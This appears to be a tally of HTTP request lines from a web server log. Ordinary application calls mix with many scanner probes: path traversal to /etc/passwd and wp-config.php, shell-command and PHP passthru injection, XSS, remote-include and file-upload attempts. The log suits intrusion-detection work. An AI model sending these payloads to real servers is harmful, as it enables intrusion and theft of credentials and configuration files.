"GET /piwigo/install.php?dl=/../../local/config/index.php HTTP/1.1"###1
"GET /message/list/?_random=1405751002765 HTTP/1.0"###1
"GET /servlet/org.apache.catalina.servlets.DefaultServlet/ HTTP/1.1"###1
"GET /kimai/index.php HTTP/1.1"###1
"GET /message/list/?_random=1405760317544 HTTP/1.0"###1
"GET /CFIDE/componentutils/cfcexplorer.cfc?method=getcfcinhtml&name=CFIDE.adminapi.administrator&path=../../../license.txt HTTP/1.1"###1
"GET /phpBB/bb_smilies.php?user=MToxOjE6MToxOjE6MToxOjE6Li4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZAAK HTTP/1.1"###1
"GET /message/list/?_random=1405733601922 HTTP/1.0"###1
"GET /scripts/ttawebtop.cgi/?action=start&pg=../../../../../../../../../../../etc/passwd HTTP/1.1"###1
"GET /message/list/?_random=1405730791095 HTTP/1.0"###1
"GET /chathistory/list/53c72496c60ab0dc6a78c8d5/1/20 HTTP/1.0"###1
"GET /xsql/lib/XSQLConfig.xml HTTP/1.1"###1
"GET /message/list/?_random=1405780017829 HTTP/1.0"###1
"PROPFIND / HTTP/1.1"###1
"GET /cgi-bin/sh HTTP/1.1"###1
"GET /message/list/?_random=1405779753990 HTTP/1.0"###1
"GET /scripts/shop.pl/page=;cat%20shop.pl| HTTP/1.1"###1
"GET /pma/doc/html/index.html HTTP/1.1"###1
"GET /search?NS-query-pat=..\..\..\..\..\..\..\..\winnt\win.ini HTTP/1.1"###1
"GET /phpnuke/html/modules.php?name=Network_Tools&file=index&func=ping_host&hinput=%3Bid HTTP/1.1"###1
"GET /gettext.php?file=../../../../../../../../../../../etc/passwd HTTP/1.1"###1
"GET /RsasTest578822377.html HTTP/1.1"###1
"GET /message/list/?_random=1405746694974 HTTP/1.0"###1
"GET /viewtopic.php HTTP/1.0"###1
"GET /servlet/org.apache.catalina.servlets.DefaultServlet/index.html HTTP/1.1"###1
"GET /cgi-bin/ftp/ftp.pl?dir=../../../../../../etc HTTP/1.1"###1
"GET /php_nuke/html/modules.php?name=Network_Tools&file=index&func=ping_host&hinput=%3Bid HTTP/1.1"###1
"GET /cgi-bin/htsearch?exclude=%60/etc/passwd%60 HTTP/1.1"###1
"GET /confluence/login.action HTTP/1.1"###1
"GET /cgi-bin/infosrch.cgi?cmd=getdoc&db=man&fname=|/usr/bin/id HTTP/1.1"###1
"GET /message/list/?_random=1405760386927 HTTP/1.0"###1
"GET /php/ HTTP/1.1"###1
"GET /phpnew/admin.php?upload=1&file=config.php&file_name=RSAS.txt&wdir=/images/&userfile=config.php&userfile_name=RSAS.txt HTTP/1.1"###1
"POST /spywall/blocked_file.php HTTP/1.1"###1
"GET /message/list/?_random=1405760263297 HTTP/1.0"###1
"GET /forums/viewtopic.php HTTP/1.0"###1
"GET /forum/viewtopic.php HTTP/1.0"###1
"GET /examples/jsp/snp/anything.snp HTTP/1.1"###1
"GET /cgi-bin/bash HTTP/1.1"###1
"GET /message/list/?_random=1405704117275 HTTP/1.0"###1
"GET /nuke/admin.php?upload=1&file=config.php&file_name=RSAS.txt&wdir=/images/&userfile=config.php&userfile_name=RSAS.txt HTTP/1.1"###1
"GET /user/getuser?_random=1405725446484 HTTP/1.0"###1
"GET /scripts/zsh HTTP/1.1"###1
"GET /message/list/?_random=1405755262825 HTTP/1.0"###1
"GET /cgi-bin/powerup/r.cgi?FILE=../../../../../../../../../../etc/passwd HTTP/1.1"###1
"PUT /zauroscantestn123321d.html HTTP/1.0"###1
"GET /sql.php?server=000&cfgServers[000][host]=hello&btnDrop=No&goto=/etc/passwd HTTP/1.1"###1
"GET /message/list/?_random=1405734891412 HTTP/1.0"###1
"ANY /appServer/jvmReport.jsf HTTP/1.1"###1
"GET /servlet/org.apache.catalina.ContainerServlet/<DEFANGED_SCRIPT>alert(document.domain)</DEFANGED_SCRIPT> HTTP/1.1"###1
"GET /admin/contextAdmin/contextList.jsp HTTP/1.1"###1
"GET /pls/help/<SCRIPT>alert(document.domain)</SCRIPT> HTTP/1.1"###1
"GET /ifx/?LO=../../../../../etc/passwd HTTP/1.1"###1
"GET /php_nuke/html/ HTTP/1.1"###1
"GET /home.cfml?Mode=debug HTTP/1.1"###1
"GET /install.php?dl=/../../local/config/index.php HTTP/1.1"###1
"POST /wordpress/wp-content/plugins/foxypress/uploadify/uploadify.php HTTP/1.1"###1
"GET /message/list/?_random=1405759495387 HTTP/1.0"###1
"GET /scripts/search.cgi?user_id=1&database=..\..\..\..\..\..\..\..\winnt\win.ini&template=..\..\..\..\..\..\..\winnt\win.ini&distinct=1 HTTP/1.1"###1
"GET /scripts/infosrch.cgi?cmd=getdoc&db=man&fname=|/usr/bin/id HTTP/1.1"###1
"GET /Admin.po?proceed=yes HTTP/1.1"###1
"GET /piranha/secure/control.php3? HTTP/1.1"###2
"POST /horde/services/javascript.php HTTP/1.1"###1
"GET /user/getuser?_random=1405763374202 HTTP/1.0"###1
"GET /message/list/?_random=1405737243855 HTTP/1.0"###1
"GET /scripts/login.action HTTP/1.1"###1
"POST /xoda-0.4.2/?upload HTTP/1.1"###1
"GET /scripts/sql.php3?server=000&cfgServers[000][host]=hello&btnDrop=No&goto=/etc/passwd HTTP/1.1"###1
"GET /message/list/?_random=1405701266781 HTTP/1.0"###1
"GET /plugins/editors/tinymce/jscripts/tiny_mce/plugins/tinybrowser/upload.php?type=file&folder= HTTP/1.1"###1
"GET /message/list/?_random=1405737304039 HTTP/1.0"###1
"GET /examples/servlet/TroubleShooter HTTP/1.1"###1
"GET /scripts/empower?DB=whateverwhatever HTTP/1.1"###1
"GET /message/list/?_random=1405760265010 HTTP/1.0"###1
"GET /havalite/tmp/files/abcdef1234.php HTTP/1.1"###1
"POST /cgi-bin/twiki/bin/view HTTP/1.0"###1
"GET /:/x.jsp HTTP/1.1"###1
"GET /scripts/dbman/db.cgi?db=no-db HTTP/1.1"###1
"GET /user/getuser?_random=1405737294852 HTTP/1.0"###1
"GET /cgi-bin/store.cgi?StartID=../../../../../../../../../etc/passwd%00.html HTTP/1.1"###1
"GET /message/list/?_random=1405779754655 HTTP/1.0"###1
"GET /user/getuser?_random=1405780511852 HTTP/1.0"###1
"GET /RsasTest1764201152.html HTTP/1.1"###1
"GET /message/list/?_random=1405761550659 HTTP/1.0"###1
"GET /message/list/?_random=1405758110997 HTTP/1.0"###1
"GET /scripts/bb_smilies.php?user=MToxOjE6MToxOjE6MToxOjE6Li4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZAAK HTTP/1.1"###1
"GET /scripts/swc?ctr=XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX HTTP/1.1"###1
"GET /admin.php?upload=1&file=config.php&file_name=RSAS.txt&wdir=/images/&userfile=config.php&userfile_name=RSAS.txt HTTP/1.1"###1
"GET /cgi-bin/common.php?f=0&ForumLang=../../../../../../../etc/passwd HTTP/1.1"###1
"POST /xoda-0.4.5/?upload HTTP/1.1"###1
"POST /order/53c87b9ac60ab0dc6a79a979/closesession HTTP/1.1"###1
"GET /message/list/?_random=1405760512998 HTTP/1.0"###1
"GET /way-board/way-board.cgi?db=/etc/passwd%00 HTTP/1.1"###1
"GET /xsql/demo/airport/airport.xsql?xml-stylesheet=none HTTP/1.1"###1
"GET /message/list/?_random=1405701234978 HTTP/1.0"###1
"GET /cgi-bin/ HTTP/1.1"###1
"GET /reports/rwservlet/showmap HTTP/1.1"###1
"GET /phpbb/viewtopic.php HTTP/1.0"###1
"GET /message/list/?_random=1405730790312 HTTP/1.0"###1
"GET /scripts/admin.php?upload=1&file=config.php&file_name=RSAS.txt&wdir=/images/&userfile=config.php&userfile_name=RSAS.txt HTTP/1.1"###1
"GET /cgi-bin/whois.cgi?action=load&whois=%3Bid HTTP/1.1"###1
"GET /scripts/info2www HTTP/1.1"###1
"GET /scripts/bash HTTP/1.1"###1
"GET /message/list/?_random=1405755252840 HTTP/1.0"###1
"GET /cgi-bin/ttawebtop.cgi/?action=start&pg=../../../../../../../../../../../etc/passwd HTTP/1.1"###1
"GET /message/list/?_random=1405737246561 HTTP/1.0"###1
"GET /cgi-bin/simple/view_page?mv_arg=|cat%20/etc/passwd| HTTP/1.1"###1
"GET /stronghold-status HTTP/1.1"###1
"GET /message/list/?_random=1405746707554 HTTP/1.0"###1
"GET /cgi-bin/ans.pl?p=../../../../../usr/bin/id|&blah HTTP/1.1"###1
"INDEX / HTTP/1.0"###1
"GET /scripts/edit_image.php?dn=1&userfile=/etc/passwd&userfile_name=%20;id;%20 HTTP/1.1"###1
"GET /message/list/?_random=1405780989876 HTTP/1.0"###115
"GET /demo/ HTTP/1.1"###1
"GET /cgi-bin/modules.php?name=Network_Tools&file=index&func=ping_host&hinput=%3Bid HTTP/1.1"###1
"GET /user/getuser?_random=1405780985063 HTTP/1.0"###1
"GET /userRpmNatDebugRpm26525557/linux_cmdline.html HTTP/1.1"###1
"GET /scripts/tcsh HTTP/1.1"###1
"GET /index.php?page=../../../../../../../../../../../../../../../../../WINNT/system32/ipconfig.exe HTTP/1.1"###1
"GET /cgi-bin/ans/ans.pl?p=../../../../../usr/bin/id|&blah HTTP/1.1"###1
"GET /message/list/?_random=1405760253677 HTTP/1.0"###1
"GET /index.php HTTP/1.0"###3
"GET /record/list/1/10 HTTP/1.0"###24
"GET /scripts/ans.pl?p=../../../../../usr/bin/id|&blah HTTP/1.1"###1
"GET /message/list/?_random=1405780588274 HTTP/1.0"###1
"GET /gui HTTP/1.1"###1
"GET /ROADS/cgi-bin/search.pl?form=../../../../../../etc/passwd%00 HTTP/1.1"###1
"GET /message/list/?_random=1405749359031 HTTP/1.0"###1
"GET /demo/modules.php?name=Network_Tools&file=index&func=ping_host&hinput=%3Bid HTTP/1.1"###1
"GET /nosuchfile-10303-10310.php3 HTTP/1.1"###1
"GET /message/list/?_random=1405780016172 HTTP/1.0"###1
"GET /cgi-bin/search.cgi?user_id=1&database=..\..\..\..\..\..\..\..\winnt\win.ini&template=..\..\..\..\..\..\..\winnt\win.ini&distinct=1 HTTP/1.1"###1
"GET /phpBB/viewtopic.php HTTP/1.0"###1
"GET /scripts/simple/view_page?mv_arg=|cat%20/etc/passwd| HTTP/1.1"###1
"GET /user/getuser?_random=1405748994466 HTTP/1.0"###1
"GET /awstatstotals/awstatstotals.php?sort=%7b%24%7bpassthru(chr(99).chr(97).chr(116).chr(32).chr(47).chr(101).chr(116).chr(99).chr(47).chr(112).chr(97).chr(115).chr(115).chr(119).chr(100))%7d%7d%7b%24%7bexit()%7d%7d HTTP/1.1"###1
"GET /cgi-local/cgiemail-1.6/cgicso?query=AAA HTTP/1.1"###1
"GET /cgi-bin/htsearch?-c/nonexistent HTTP/1.1"###1
"GET /scripts/cgicso?query=AAA HTTP/1.1"###1
"GET /cgi-bin/awstatstotals.php?sort=%7b%24%7bpassthru(chr(100).chr(105).chr(114).chr(32).chr(47).chr(65).chr(58).chr(72).chr(32).chr(99).chr(58))%7d%7d%7b%24%7bexit()%7d%7d HTTP/1.1"###1
"GET /message/list/?_random=1405734887166 HTTP/1.0"###1
"GET /message/list/?_random=1405734915811 HTTP/1.0"###1
"GET /webalizer/ HTTP/1.1"###1
"GET /cgi-bin/php.cgi?/etc/passwd HTTP/1.1"###1
"GET /message/list/?_random=1405748997934 HTTP/1.0"###1
"GET /scripts/support/common.php?f=0&ForumLang=../../../../../../../etc/passwd HTTP/1.1"###1
"GET /cgi-bin/awstats/awstats.pl?configdir=%7Ccat%20/etc/passwd;\n%7C HTTP/1.0"###1
"GET /story.pl?next=../../../../../etc/passwd%00 HTTP/1.1"###1
"GET /message/list/?_random=1405737301606 HTTP/1.0"###1
"GET /irpt/i/serverlogAction.do?input=def&cfrom=# HTTP/1.1"###1
"GET /scripts/shopper.cgi?newpage=../../../../../../etc/passwd HTTP/1.1"###1
"GET /message/list/?_random=1405760221460 HTTP/1.0"###1
"GET /cgi-bin/search/search.cgi?keys=*&prc=any&catigory=../../../../../../../../../../../../etc HTTP/1.1"###1
"GET /scripts/story/story.pl?next=../../../../../etc/passwd%00 HTTP/1.1"###1
"GET /story/story.pl?next=../../../../../etc/passwd%00 HTTP/1.1"###1
"GET /message/list/?_random=1405746639167 HTTP/1.0"###1
"GET /message/list/?_random=1405759941916 HTTP/1.0"###1
"GET /message/list/?_random=1405760320027 HTTP/1.0"###1
"GET /servlet/org.apache.catalina.servlets.DefaultServlet/sort.jsp HTTP/1.1"###1
"GET /SSI/index.htm HTTP/1.1"###2
"GET /message/list/?_random=1405759506772 HTTP/1.0"###1
"POST /fckeditor/editor/filemanager/connectors/asp/connector.asp?Command=FileUpload&Type=File&CurrentFolder=%2F HTTP/1.1"###2
"GET /scriptsdirectory.php?dir=%3Bcat%20/etc/passwd HTTP/1.1"###1
"GET /message/list/?_random=1405746692008 HTTP/1.0"###1
"GET /cgi-bin/?Mode=debug HTTP/1.1"###1
"GET /scripts/story/story.pl?next=about HTTP/1.1"###1
"GET /wp-content/plugins/mac-dock-gallery/macdownload.php?albid=../../../wp-config.php HTTP/1.1"###1
"GET /jsp/index.html HTTP/1.1"###1
"GET /phpMyAdmin/db_details_importdocsql.php?submit_show=true&do=import&docpath=./ HTTP/1.0"###1
"POST /rtrlet/rtr HTTP/1.1"###2
"GET /oprocmgr-status HTTP/1.1"###1
"GET /cgi-bin/nx/common/cds/menu.inc.php?c_path=http://xxxxxxxx/ HTTP/1.1"###1
"GET /message/list/?_random=1405737299721 HTTP/1.0"###1
"GET /forum/calendar.php HTTP/1.0"###1
"GET //etc/passwd HTTP/1.1"###1
"GET /user/getuser?_random=1405755238817 HTTP/1.0"###1
"GET /message/list/?_random=1405779766802 HTTP/1.0"###1
"GET /scripts/Web_Store/web_store.cgi?page=../../../../../../etc/passwd%00.html HTTP/1.1"###1
"GET /cgi-bin/auktion.cgi?menue=../../../../../../../../../etc/passwd HTTP/1.1"###1
"GET /message/list/?_random=1405734933511 HTTP/1.0"###1
"GET /cgi_bin/test-cgi?/* HTTP/1.1"###1
"GET /RsasTest982394523.html HTTP/1.1"###1
"GET /imc/login.jsf HTTP/1.1"###1
"GET /servlet/org.apache.catalina.servlets.DefaultServlet/cgi-bin/ HTTP/1.1"###1
"GET /cgi-bin/webplus.exe?about HTTP/1.1"###1
"POST /webcalendar/week.php HTTP/1.0"###1
"GET /dcforum/dcforum.cgi?az=list&forum=../../../../../../../etc/passwd%00 HTTP/1.1"###1
"GET /cgi-bin/sql.php?LIB_INC=1&btnDrop=No&goto=/etc/passwd HTTP/1.1"###1
"GET /wordpress/wp-content/plugins/mac-dock-gallery/macdownload.php?albid=../../../wp-config.php HTTP/1.1"###1
"GET /common.php?f=0&ForumLang=../../../../../../../etc/passwd HTTP/1.1"###1
"GET /message/list/?_random=1405779759628 HTTP/1.0"###1
"GET /scripts/commerce.cgi?page=../../../../../etc/passwd%00index.html HTTP/1.1"###1
"GET /scripts/ash HTTP/1.1"###1
"GET /cgi_bin/shop.pl/page=;cat%20shop.pl| HTTP/1.1"###1
"GET /message/list/?_random=1405733599713 HTTP/1.0"###1
"GET /user/getuser?_random=1405759495301 HTTP/1.0"###1
"GET /support/common.php?f=0&ForumLang=../../../../../../../etc/passwd HTTP/1.1"###1
"GET /scripts/remotehtmlview.php?phpAds_path=http://xxxxxxxx HTTP/1.1"###1
"PROPFIND / HTTP/1.0"###1
"GET /scripts/dcforum.cgi?az=list&forum=../../../../../../../etc/passwd%00 HTTP/1.1"###1
"GET /message/list/?_random=1405725472949 HTTP/1.0"###1
"GET /scripts/webplus.exe?about HTTP/1.1"###1
"POST /twiki/bin/view HTTP/1.0"###1
"GET /message/list/?_random=1405776362975 HTTP/1.0"###1
"GET /scripts/whois.cgi?action=load&whois=%3Bid HTTP/1.1"###1
"GET /phpadmin/ HTTP/1.1"###1
"GET /phpbb/bb_smilies.php?user=MToxOjE6MToxOjE6MToxOjE6Li4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZAAK HTTP/1.1"###1
"GET /message/list/?_random=1405780986515 HTTP/1.0"###1
"GET /cgi-bin/webplus?script=/../../../../etc/passwd HTTP/1.1"###1
"POST /?upload HTTP/1.1"###1
"GET /message/list/?_random=1405760195879 HTTP/1.0"###1
"GET /gettext.php?file=../../../../../../../../../../../windows/win.ini HTTP/1.1"###1
"GET /cgi-bin/csh HTTP/1.1"###1
"GET //bb_smilies.php?user=MToxOjE6MToxOjE6MToxOjE6Li4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZAAK HTTP/1.1"###1
"GET /cgi-bin/cvsweb.cgi HTTP/1.1"###1
"GET /thebox/thebox.php HTTP/1.0"###1
"GET /statistics/awstats.pl?configdir=%7Ccat%20/etc/passwd;\n%7C HTTP/1.0"###1
"GET /default.cfml?Mode=debug HTTP/1.1"###1
"GET /status HTTP/1.1"###1
"GET /perl/ HTTP/1.1"###1
"GET /pages/awstatstotals.php?sort=%7b%24%7bpassthru(chr(100).chr(105).chr(114).chr(32).chr(47).chr(65).chr(58).chr(72).chr(32).chr(99).chr(58))%7d%7d%7b%24%7bexit()%7d%7d HTTP/1.1"###1
"GET /maintain_feedback.asp?userLogin.asp HTTP/1.0"###1
"GET /message/list/?_random=1405760347579 HTTP/1.0"###1
"GET /message/list/?_random=1405733578740 HTTP/1.0"###1
"GET /nosuchfile.php/123 HTTP/1.1"###1
"GET /cgi-bin/sql.php?server=000&cfgServers[000][host]=hello&btnDrop=No&goto=/etc/passwd HTTP/1.1"###1
"GET /webpagetest/www/gettext.php?file=../../../../../../../../../../../etc/passwd HTTP/1.1"###1
"GET /message/list/?_random=1405776259727 HTTP/1.0"###1
"GET /php_nuke/html/modules.php?set_albumName=album01&id=aaw&op=modload&name=gallery&file=index&include=../../../../../../etc/passwd HTTP/1.1"###1
"GET /RsasTest2138972365.html HTTP/1.1"###1
"GET /awstats/awstats.pl?configdir=%7Ccat%20/etc/passwd;\n%7C HTTP/1.0"###1
"GET /cgi-bin/admin.php?upload=1&file=config.php&file_name=RSAS.txt&wdir=/images/&userfile=config.php&userfile_name=RSAS.txt HTTP/1.1"###1
"GET /message/list/?_random=1405755251784 HTTP/1.0"###1
"GET /cgi-bin/index.js0x70 HTTP/1.1"###1
"GET /demo/ojspext/events/index.jsp HTTP/1.1"###1
"GET /message/list/?_random=1405734930328 HTTP/1.0"###1
"GET /phpnew/ HTTP/1.1"###1
"GET /message/list/?_random=1405733601623 HTTP/1.0"###1
"GET /cgi-bin/login.action HTTP/1.1"###1
"GET /user/getuser?_random=1405746635767 HTTP/1.0"###1
"GET /fcs/ident HTTP/1.1"###1
"GET /servlet/org.apache.catalina.servlets.DefaultServlet/topic.jsp HTTP/1.1"###1
"GET /servlet/org.apache.catalina.servlets.DefaultServlet/profile.jsp HTTP/1.1"###1
"GET /scripts/ftp/ftp.pl?dir=../../../../../../etc HTTP/1.1"###1
"GET /message/list/?_random=1405704133649 HTTP/1.0"###1
"POST /order/53c9071ec60ab0dc6a7a2bbe/snatchrequest HTTP/1.0"###9
"GET /message/list/?_random=1405759511972 HTTP/1.0"###1
"GET /home.cfm?Mode=debug HTTP/1.1"###1
"GET /message/list/?_random=1405746309483 HTTP/1.0"###1
"GET /message/list/?_random=1405733586366 HTTP/1.0"###1
"GET /wiki/login.action HTTP/1.1"###1
"GET /soapdocs/docs/apiDocs/packages.html HTTP/1.1"###1
"GET /server-status HTTP/1.1"###1
"POST /SiteScope/services/APIPreferenceImpl HTTP/1.1"###1
"GET /message/list/?_random=1405746641556 HTTP/1.0"###1
"GET /scripts/sql.php3?LIB_INC=1&btnDrop=No&goto=/etc/passwd HTTP/1.1"###1
"GET /demo/modules.php?set_albumName=album01&id=aaw&op=modload&name=gallery&file=index&include=../../../../../../etc/passwd HTTP/1.1"###1
"GET /RsasTest2144270782.html HTTP/1.1"###1
"GET /scripts/php.cgi?/etc/passwd HTTP/1.1"###1
"GET /scripts/webplus?script=/../../../../etc/passwd HTTP/1.1"###1
"GET /cgi-bin/loadpage.cgi?user_id=1&file=../../../../../../etc/passwd HTTP/1.1"###1
"GET /scripts/test-cgi?/* HTTP/1.1"###1
"GET /nuke/ HTTP/1.1"###1
"GET /dms0 HTTP/1.1"###1
"GET /scripts/calendar/calender.pl?config=|cat%20/etc/passwd| HTTP/1.1"###1
"GET /message/list/?_random=1405737294932 HTTP/1.0"###1
"GET /cgi-bin/sql.php3?LIB_INC=1&btnDrop=No&goto=/etc/passwd HTTP/1.1"###1
"GET /scripts/?Mode=debug HTTP/1.1"###1
"GET /message/list/?_random=1405759498229 HTTP/1.0"###1
"GET /message/list/?_random=1405760295394 HTTP/1.0"###1
"GET /robots.txt HTTP/1.0"###1
"GET /ans.pl?p=../../../../../usr/bin/id|&blah HTTP/1.1"###1
"GET /message/list/?_random=1405736524654 HTTP/1.0"###1
"GET /RsasTest639603294.html HTTP/1.1"###1
"GET /cgi-bin/calendar/calender.pl?config=|cat%20/etc/passwd| HTTP/1.1"###1
"GET /soapdocs/ReleaseNotes.html HTTP/1.1"###1
"GET /SiteScope/services/APISiteScopeImpl HTTP/1.1"###1
"GET /cgi-bin/empower?DB=whateverwhatever HTTP/1.1"###1
"GET /crm HTTP/1.1"###1
"GET /message/list/?_random=1405760213877 HTTP/1.0"###1
"GET /cgi-local/cgiemail-1.4/cgicso?query=AAA HTTP/1.1"###1
"GET /scripts/ HTTP/1.1"###1
"GET /scripts/sql.php?LIB_INC=1&btnDrop=No&goto=/etc/passwd HTTP/1.1"###1
"GET /cgi-bin/phpinfo.php HTTP/1.1"###1
"GET /message/list/?_random=1405763377519 HTTP/1.0"###1
"GET /?sql_debug=1 HTTP/1.1"###1
"GET /message/list/?_random=1405760350977 HTTP/1.0"###1
"GET /scripts/calendar/calendar_admin.pl?config=|cat%20/etc/passwd| HTTP/1.1"###1
"GET /message/list/?_random=1405780988242 HTTP/1.0"###1
"GET /message/list/?_random=1405734913465 HTTP/1.0"###1
"GET /zabbix/ HTTP/1.1"###1
"POST /xoda-0.4.1/?upload HTTP/1.1"###1
"GET /message/list/?_random=1405725471150 HTTP/1.0"###1
"GET /index.php?page=../../../../../../../../../../../../../../../etc/passwd HTTP/1.1"###1
"GET /message/list/?_random=1405701238333 HTTP/1.0"###1
"GET /index.php/module/action/param1/${@print(base64_decode(SSBsb3ZlIGppbmdqaW5n))} HTTP/1.1"###1
"GET /cgi_bin/powerup/r.cgi?FILE=../../../../../../../../../../etc/passwd HTTP/1.1"###1
"GET /cgi-bin/info2www HTTP/1.1"###1
"POST /xoda-0.4.3/?upload HTTP/1.1"###1
"GET /scripts/nonexist HTTP/1.1"###7
"GET /scripts/hsx.cgi?show=../../../../../../../../../../../../../etc/passwd%00 HTTP/1.1"###1
"POST /user/status/off HTTP/1.0"###4
"GET /havalite/havalite/tmp/files/abcdef1234.php HTTP/1.1"###1
"GET /spywall/images/upload/temp/temp.php HTTP/1.1"###1
"GET /cgi-bin/kvm.cgi?&file=login HTTP/1.1"###1
"GET /user/getuser?_random=1405725465979 HTTP/1.0"###1
"GET /message/list/?_random=1405759504972 HTTP/1.0"###1
"GET /message/list/?_random=1405760385078 HTTP/1.0"###1
"GET /user/getuser?_random=1405701234872 HTTP/1.0"###1
"POST /xoda-0.4.0/?upload HTTP/1.1"###1
"GET /cgi-bin/search.pl?form=../../../../../../etc/passwd%00 HTTP/1.1"###1
"GET /scripts/ksh HTTP/1.1"###1
"GET /scripts/search.pl?form=../../../../../../etc/passwd%00 HTTP/1.1"###1
"GET /server-info HTTP/1.1"###1
"GET /phpPgAdmin/sql.php3?LIB_INC=1&btnDrop=No&goto=/etc/passwd HTTP/1.1"###1
"GET /SiteScope/cgi/go.exe/SiteScope?page=eventLog&machine=&logName=System&account=administrator HTTP/1.1"###1
"POST /CFIDE/adminapi/administrator.cfc HTTP/1.1"###1
"GET /cgi-local/cgicso?query=AAA HTTP/1.1"###1
"GET /message/list/?_random=1405755256681 HTTP/1.0"###1
